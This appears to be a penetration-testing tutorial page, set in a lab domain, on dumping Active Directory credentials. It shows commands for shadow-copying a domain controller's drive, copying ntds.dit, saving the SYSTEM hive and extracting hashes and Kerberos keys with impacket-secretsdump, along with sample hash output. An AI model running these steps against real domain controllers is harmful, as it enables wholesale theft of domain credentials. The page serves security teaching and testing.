---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Shadow Copies

A **Shadow Copy**, is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes even while they are in use. This is helpful because as mentioned previously, Active Directory maintains a lock on the [`Ntds.dit`](../authentication/#ntds.dit) file while it is running. However if the attacker is able to gain administrator access to the domain controller, a shadow copy could be created circumventing the lock.

To pull of this attack the attacker will need 2 things:

1. Copy of the `Ntds.dit` file
2. Copy of `HKEY_LOCAL_MACHINE\SYSTEM` registry hive
   * Required to obtain the _Boot Key_ for decrypting `ntds.dit`

Both of these can be obtained with Administrator access to the domain controller's file system.

## Example Background

As these are persistence methods assume the attacker has gained some access to DC1 using the `jeffadmin` account. Commands shown here will be run directly on the domain controller.

## Creating the Shadow Copy

To create this copy the [VShadow](../../built-in-tools/vshadow.md) (`vshadow.exe`) tool will be used. The domain controller's entire `C:` drive will be copied from the command line:

```
vshadow.exe -nw -p  C:
```

When run on the DC this will generate a flurry of activity. Of importance in the output is the `Shadow copy device name` field which will be used to reference the copy later:

```
C:\Users\jeffadmin>.\vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Persistent shadow copy)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000019
Creating shadow set {23e00784-c8a9-46e4-af55-92fafcd9c20c} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {23e00784-c8a9-46e4-af55-92fafcd9c20c} ...

* SNAPSHOT ID = {c4343349-17f8-41a7-8d90-145cb86938c5} ...
   - Shadow copy Set: {23e00784-c8a9-46e4-af55-92fafcd9c20c}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 4/10/2024 12:50:30 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  No_Auto_Release Persistent No_Writers Differential


Snapshot creation done.
```

The `Shadow copy device name` can be used to access the files in the copy by replacing C: in the file path with the value found here. For example to retrieve the `ntds.dit` file which is stored at `C:\Windows\ntds\ntds.dit`, the attacker would use the command:

{% code overflow="wrap" %}
```sh
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit .\ntds.dit
```
{% endcode %}

## Saving the `SYSTEM` Hive

The system hive can be saved with [`reg.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) and the [`save`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save) command. To copy the whole SYSTEM hive the command would be:

```
reg save hklm\system .\system.hiv
```

* `.\system.hiv` is the name of the saved backup. This can be any value

At this point the `ntds.dit` and `system.hiv` files can be moved back to the attacker's machine for further analysis.

## Extracting the `Ntds.dit` Data

### Impacket

Impacket's [`secretsdump`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) can be used to extract the data from ntds.dit. The command structure is as follows:

```bash
impacket-secretsdump -ntds ntds.dit -system system.hiv -outputfile dc1_data LOCAL
```

* `-ntds` specifies the ntds.dit file to parse
* `-system` specifies the SYSTEM hive for parsing
* `-outputfile` saves the extracted data in files with names starting with the value provided here (`dc1_data` in this case)
* `LOCAL` tells the tool to parse local files&#x20;

Once run the hashes will be exposed:

```shell-session
kali@kali:~$ impacket-secretsdump -ntds ntds.dit -system system.hiv -outputfile dc1_data LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
...
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eb9131bbcdafe388b4ed8a511493dfc6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
...
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:3a7eed97e5f097bfe765dd31dad3586aef70aaacaa2423840aa40c5596f4b3b7
DC1$:aes128-cts-hmac-sha1-96:f49c5a4a9b383f10f83593050542a55a
DC1$:des-cbc-md5:2568d502e564801f
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
CLIENT76$:des-cbc-md5:dce683e3409b9402
[*] Cleaning up...
```

Several output files are created:

```shell-session
kali@kali:~$ ls                    
dc1_data.ntds
dc1_data.ntds.cleartext
dc1_data.ntds.kerberos
...
```

* `dc1_data.ntds` contains the password hashes
* `dc1_data.ntds.cleartext` contains any cleartext passwords
* `dc1_data.ntds.kerberos` contains the extracted Kerberos keys

Now that the hashes have been extracted they can be used for any of the techniques covered here. One could also attempt to crack them. While this method works fine, it leaves an access trail and may require the attacker to upload tools.

A stealthier alternative is to abuse AD functionality itself to capture hashes remotely from a workstation. To do this, one could move laterally to the domain controller and run [Mimikatz](../../../software/mimikatz.md) to dump the password hash of every user, using the [DC sync](../authentication/attacking-ad-authentication/dc-sync.md) method described previously. This is a less conspicuous persistence technique that one can misuse.
